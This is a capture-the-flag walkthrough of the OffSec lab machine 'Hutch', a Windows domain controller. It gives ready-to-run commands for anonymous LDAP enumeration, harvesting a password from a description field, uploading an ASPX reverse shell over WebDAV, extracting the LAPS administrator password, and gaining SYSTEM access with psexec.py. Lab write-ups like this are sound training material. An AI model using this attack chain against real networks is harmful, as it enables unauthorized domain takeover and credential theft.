---
title: Hutch
description: PG Practice Hutch by ethicx

categories:
  - CTF
  - HTB
  - OffSec

tags:
  - active-directory
  - ldap
  - webdav
  - laps
  - windows
  - privilege-escalation
  - impacket

image:
  path: /assets/hutch.jpg
---

## Target Information

* **IP:** `192.168.89.122`
* **Hostname:** `HUTCHDC`
* **Domain:** `hutch.offsec`
* **OS:** Windows Server (Domain Controller)

---

## Enumeration

### Nmap Scan

```bash
sudo nmap 192.168.89.122 -p- -sS -sV
```

#### Open Ports

```
53/tcp    DNS
80/tcp    HTTP (Microsoft IIS 10.0)
88/tcp    Kerberos
135/tcp   MSRPC
139/tcp   NetBIOS
389/tcp   LDAP
445/tcp   SMB
464/tcp   Kerberos kpasswd
593/tcp   RPC over HTTP
636/tcp   LDAPS
3268/tcp  Global Catalog LDAP
3269/tcp  Global Catalog LDAPS
5985/tcp  WinRM
9389/tcp  .NET Message Framing
```

The exposed LDAP, SMB, Kerberos, and IIS services indicate this host is a **Domain Controller**.

---

## LDAP Enumeration

I started by running LDAP-related Nmap scripts.

```bash
nmap -n -sV --script "ldap* and not brute" 192.168.89.122
```

From the output, the **naming context** was identified as:

```
DC=hutch,DC=offsec
```

### Anonymous LDAP User Enumeration

Using anonymous LDAP bind, I enumerated user accounts by grepping `sAMAccountName`.

```bash
ldapsearch -x -h 192.168.89.122 -D '' -w '' \
-b "DC=hutch,DC=offsec" | grep sAMAccountName
```

#### Discovered Users

```
rplacidi
opatry
ltaunton
acostello
jsparwell
oknee
jmckendry
avictoria
jfrarey
eaburrow
cluddy
agitthouse
fmcsorley
```

---

## Credential Disclosure via LDAP Description

Next, I searched LDAP for `description` fields.

```bash
ldapsearch -x -h 192.168.89.122 -D '' -w '' \
-b "DC=hutch,DC=offsec" | grep description
```

One of the entries contained a **cleartext password**.

### Credentials Found

```
fmcsorley : CrabSharkJellyfish192
```

---

## Credential Validation

The credentials were validated against SMB using CrackMapExec.

```bash
crackmapexec smb 192.168.89.122 -u fmcsorley -p CrabSharkJellyfish192
```

Authentication was successful.

---

## WebDAV Exploitation (Initial Access)

Nikto enumeration earlier revealed that **WebDAV** was enabled on IIS.

Since no writable directory was obvious, I attempted to upload directly to the web root using valid credentials.

### ASPX Reverse Shell Upload

```bash
curl -T shell.aspx http://192.168.89.122/ \
-u fmcsorley:CrabSharkJellyfish192
```

### Reverse Shell Listener

```bash
nc -lvnp 445
```

After browsing to:

```
http://192.168.89.122/shell.aspx
```

A reverse shell was received successfully.

---

## Post-Exploitation Enumeration

While enumerating the system, I discovered that **LAPS (Local Administrator Password Solution)** was installed.

This raised the possibility of misconfigured LDAP permissions allowing retrieval of local administrator passwords.

---

## LAPS Password Extraction

Using the valid domain credentials, I queried LDAP for the `ms-Mcs-AdmPwd` attribute.

```bash
ldapsearch -x -h 192.168.89.122 \
-D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' \
-b 'DC=hutch,DC=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

### LAPS Password Retrieved

```
Computer: HUTCHDC
ms-Mcs-AdmPwd: J6QOuU+lhs[SH/
```

---

## Privilege Escalation to Domain Admin

The extracted LAPS password was validated using CrackMapExec.

```bash
crackmapexec ldap 192.168.89.122 \
-u Administrator -p 'J6QOuU+lhs[SH/'
```

Authentication succeeded.

---

## Domain Controller Compromise

Using Impacketâ€™s `psexec.py`, I authenticated as the local Administrator and obtained a **SYSTEM shell** on the Domain Controller.

```bash
psexec.py hutch/Administrator:'J6QOuU+lhs[SH/'@192.168.89.122
```

### Result

```
NT AUTHORITY\SYSTEM
```

Full Domain Controller compromise achieved.

---

## Attack Chain Summary

1. Anonymous LDAP enumeration exposed domain structure
2. Cleartext credentials leaked via LDAP `description`
3. Valid user credentials enabled WebDAV file upload
4. ASPX shell provided initial foothold
5. Misconfigured LAPS permissions leaked Administrator password
6. SYSTEM access obtained via Impacket `psexec`

---
